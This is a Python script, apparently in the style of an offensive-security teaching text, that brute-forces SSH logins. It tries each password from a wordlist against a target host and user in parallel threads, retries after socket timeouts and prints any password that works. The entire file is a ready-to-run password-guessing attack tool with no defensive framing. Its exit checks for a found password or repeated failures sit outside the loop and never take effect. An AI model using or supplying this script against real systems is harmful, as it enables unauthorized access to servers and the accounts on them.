#!/usr/bin/env python
# encoding: utf-8
# author: Lock
# time: 2016/11/7 14:48

import optparse
from pexpect import pxssh
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host, user, password, release):
    global Found, Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Good , Key Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def run():
    parser = optparse.OptionParser('usage: '+'-H <target host> -u <user> -f <password list>')
    parser.add_option('-H', dest='tgtHost', type='string',help='specify target host')
    parser.add_option('-f', dest='passwdFile', type='string',help='specify password file')
    parser.add_option('-u', dest='user', type='string',help='specify the user')
    parser.add_option('-c', dest='count', type='int',help='specify the max ssh connect count , default 5',default=5)
    (options, args) = parser.parse_args()
    global connection_lock
    connection_lock = threading.BoundedSemaphore(options.count)
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user
    if host == None or passwdFile == None or user ==None:
        print(parser.usage)
        exit(0)
    with open(passwdFile,'r') as fp:
        if Found:
            print "[*] Exiting: Key Found"
            exit(0)
        if Fails > 5:
            print "[!] Exiting: Too Many Socket Timeouts"
            exit(0)
        for item in fp.readlines():
            connection_lock.acquire()
            password = item.strip('\r').strip('\n')
            print("[-] Testing: " + str(password))
            t = threading.Thread(target=connect, args=(host, user, password, True))
            t.start()

if __name__ == '__main__':
    run()